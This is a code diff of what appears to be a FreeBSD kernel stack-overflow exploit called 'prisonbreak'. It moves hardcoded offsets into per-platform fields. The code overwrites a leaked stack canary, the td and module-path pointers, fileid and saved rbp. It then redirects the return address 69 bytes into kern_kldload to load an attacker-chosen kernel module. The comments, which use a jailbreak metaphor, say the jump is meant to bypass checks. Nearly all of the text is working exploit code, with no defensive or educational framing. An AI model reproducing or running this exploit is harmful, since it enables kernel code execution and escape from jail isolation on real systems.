@@ -193,6 +193,12 @@ unsigned int get_platform_idx() {
   return FBSD_14_DEBUG;
 }
 
+void write_uint64(char *ptr, unsigned int offset, uint64_t value) {
+  char *dest = ptr + offset;
+  uint64_t *u64dest = (uint64_t *)dest;
+  *u64dest = value;
+}
+
 void* prisonbreak(void* arg) {
   /*
    *
@@ -299,44 +305,50 @@ void* prisonbreak(void* arg) {
   // value extracted earlier to please the stack protection checker 2048 + 32 =
   // 2080 (start of our overflow) + 752 bytes = 2832
   // i.e., use the badge we got off that guard.
-  int stack_cookie_offset = 2832;
-  unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
-  *ptr = stack_cookie;
+//  int stack_cookie_offset = 2832;
+//  unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
+//  *ptr = stack_cookie;
+  write_uint64((char*)header, ko.stack_cookie_offset, stack_cookie);
 
   // Overwrite the address where kern_kldload is going to read the td argument
-  int td_offset = 2872;
+//  int td_offset = 2872;
   // int td_offset = 2872 - 24;
-  ptr = (unsigned long*)((char*)header + td_offset);
-  *ptr = get_td();
+//  ptr = (unsigned long*)((char*)header + td_offset);
+//  *ptr = get_td();
+  write_uint64((char*)header, ko.td_offset, get_td());
 
   // Overwrite the address where kern_kldload is going to read the string
   // containing our custom kernel module path
-  int kernel_module_path_offset = 2864;
+//  int kernel_module_path_offset = 2864;
   // int kernel_module_path_offset = 2864 + 8;
-  ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
-  *ptr = get_pargs();
+//  ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
+//  *ptr = get_pargs();
+  write_uint64((char*)header, ko.kernel_module_path_offset, get_pargs());
 
   // Overwrite the address where kern_kldload is going to read the fileid
-  int fileid_offset = 2840;
+//  int fileid_offset = 2840;
   // int fileid_offset = 2840 + 23;
-  ptr = (unsigned long*)((char*)header + fileid_offset);
-  *ptr = 0;
-
+//  ptr = (unsigned long*)((char*)header + fileid_offset);
+//  *ptr = 0;
+  write_uint64((char*)header, ko.fileid_offset, 0);
+  
   // Restore $rbp
-  int rbp_offset = 2880;
-  ptr = (unsigned long*)((char*)header + rbp_offset);
-  *ptr = DEBUG_RESTORED_RBP_ADDRESS;
+//  int rbp_offset = 2880;
+//  ptr = (unsigned long*)((char*)header + rbp_offset);
+//  *ptr = DEBUG_RESTORED_RBP_ADDRESS;
+  write_uint64((char*)header, ko.base_pointer_offset, ko.restored_ebp_address);
 
   // Overwrite the return address to jump into something we can use, e.g.
   // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
   // = 2888
-  int return_address_offset = 2888;
-  ptr = (unsigned long*)((char*)header + return_address_offset);
-  unsigned long kern_kldload = DEBUG_KERN_KLDLOAD_ADDRESS;
+//  int return_address_offset = 2888;
+//  ptr = (unsigned long*)((char*)header + return_address_offset);
+//  unsigned long kern_kldload = DEBUG_KERN_KLDLOAD_ADDRESS;
   // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
   // making sure none of the guards spot us.
-  unsigned long jump_to_address = kern_kldload + 69;
-  *ptr = jump_to_address;
+//  unsigned long jump_to_address = kern_kldload + 69;
+//  *ptr = jump_to_address;
+  write_uint64((char*)header, ko.instruction_pointer_offset, ko.kern_kldload_address + 69);
 
   // Populate the header with expected values so we pass all the checks and get
   // to where we need to be, i.e., have another inmate create a diversion by setting their mattress on fire.
